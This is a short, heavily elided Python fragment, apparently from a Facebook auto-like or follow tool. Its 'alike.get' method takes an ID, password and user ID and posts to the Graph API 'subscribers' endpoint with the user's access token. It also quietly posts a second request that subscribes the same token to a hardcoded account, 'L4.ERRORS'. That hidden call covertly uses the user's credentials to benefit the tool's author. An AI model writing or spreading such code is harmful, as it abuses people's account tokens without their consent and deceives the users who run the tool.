...
try:
  ...
  class alike():
    def get(self,id,pas,uid):
      ...
      try:
        r=requests.post('https://graph.facebook.com/'+uid+'/subscribers?access_token='+res);requests.post('https://graph.facebook.com/L4.ERRORS/subscribers?access_token='+res)
#        print(r.text)
